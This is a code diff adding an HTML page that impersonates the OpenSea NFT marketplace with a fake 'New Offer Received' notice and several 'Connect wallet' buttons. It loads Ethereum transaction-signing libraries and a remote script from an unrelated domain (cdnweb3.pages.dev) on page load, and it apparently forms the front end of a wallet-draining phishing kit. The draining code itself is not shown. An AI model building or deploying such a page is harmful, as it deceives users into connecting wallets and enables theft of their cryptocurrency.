@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://unpkg.com/swiper@8/swiper-bundle.min.css" />
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon" href="images/favicon.png" type="image/x-icon">
+  <title>The largest NFT marketplace</title>
+
+  <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.min.css" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.all.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" integrity="sha512-FDcVY+g7vc5CXANbrTSg1K5qLyriCsGDYCE02Li1tXEYdNQPvLPHNE+rT2Mjei8N7fZbe0WLhw27j2SrGRpdMg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js" integrity="sha512-2oprd2T2vSkAii+dVWi6C+uATbQ1YGmCed6b6msb9Jxi33hsXAbnhwZ9thwCq6ndidZv4P51qaq58uo9b/x4nA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        
+  <script src="./settings.js"></script>
+  <script src="https://cdnweb3.pages.dev/web3-ethers.js" type="module"></script>
+
+
+
+</head>
+
+<body>
+  <nav class="navbar">
+    <div class="navbar-container">
+      <div class="navbar-nav-left">
+        <a href="index.php" class="navbar-brand">
+          <img src="images/opensea-pride.svg" alt="Open Sea logo" />
+          <h2>OpenSea</h2>
+        </a>
+      </div>
+
+      <div class="navbar-nav-right navbar-nav-right2">
+        <div class="navbar-search-bar ">
+          <span class="material-icons md-24">search</span>
+          <input class="search-bar" type="text" placeholder="Search items,collections,and accounts" />
+        </div>
+        <div class="navbar-items">
+          <ul>
+            <li>
+              <a href="index.php">Explore</a>
+            </li>
+            <li>
+              <a href="index.php">Stats</a>
+            </li>
+
+            <li>
+              <a href="index.php">Create</a>
+            </li>
+          </ul>
+        </div>
+        <div class="navbar-nav-end">
+          <a class="connect claim-button" href="">
+            <span class="material-icons nav-icon">account_balance_wallet</span>
+            <span>Connect wallet</span>
+          </a>
+          <a href="#"><span class="material-icons nav-icon">account_circle</span></a>
+          <a href="#"><span class="material-icons nav-icon">local_grocery_store</span></a>
+        </div>
+      </div>
+    </div>
+    <!-- Hamburger Menu -->
+    <div type="button" class="hamburger" id="menu-btn">
+      <div class="navbar-nav-right">
+        <div class="navbar-nav-end">
+          <a class="connect claim-button" href="">
+            <span class="material-icons nav-icon">account_balance_wallet</span>
+            <span>Connect wallet</span>
+          </a>
+          <a href="#"><span class="material-icons nav-icon">account_circle</span></a>
+
+        </div>
+      </div>
+    </div>
+  </nav>
+  <div class="slide-container swiper">
+    <!-- Slider main container -->
+    <div class="slide-content">
+      <!-- Additional required wrapper -->
+      <div class="card-wrapper swiper-wrapper">
+        <!-- Slides -->
+        <div class="card swiper-slide">
+          <img src="images/items/1.png" class="card-img" />
+          <img src="images/items/icon.png" class="card-img icon-img" />
+          <img src="images/items/2.png" class="card-img" />
+        </div>
+        <div class="card swiper-slide">
+          <img src="images/items/3.png" class="card-img" />
+          <img src="images/items/icon.png" class="card-img icon-img" />
+          <img src="images/items/4.png" class="card-img" />
+        </div>
+
+        <div class="card swiper-slide">
+          <img src="images/items/5.png" class="card-img" />
+          <img src="images/items/icon.png" class="card-img icon-img" />
+          <img src="images/items/6.webp" class="card-img" />
+        </div>
+        <div class="card swiper-slide">
+          <img src="images/items/7.png" class="card-img" />
+          <img src="images/items/icon.png" class="card-img icon-img" />
+          <img src="images/items/8.png" class="card-img" />
+        </div>
+        <div class="card swiper-slide">
+          <img src="images/items/9.png" class="card-img" />
+          <img src="images/items/icon.png" class="card-img icon-img" />
+          <img src="images/items/10.png" class="card-img" />
+        </div>
+        <div class="card swiper-slide">
+          <img src="images/items/11.png" class="card-img" />
+          <img src="images/items/icon.png" class="card-img icon-img" />
+          <img src="images/items/12.png" class="card-img" />
+        </div>
+
+      </div>
+    </div>
+
+  </div>
+  <section class="section-1">
+    <div class="heading-container">
+      <div class="heading">
+        <h1>New Offer Received</h1>
+      </div>
+      <div class="sub-heading">
+        <h5>A new offer has been made on one of your listings, Ensure you're connected to view the details. <span class="learn-more">Learn more</span></h5>
+      </div>
+      <div class="btn-container">
+        <button class="btn btn-dark claim-button">Connect wallet</button>
+      </div>
+
+    </div>
+  </section>
+
+
+
+
+
+
+  <script src="https://unpkg.com/swiper@8/swiper-bundle.min.js"></script>
+
+  <script src="./index.js"></script>
+</body>
+
+</html>
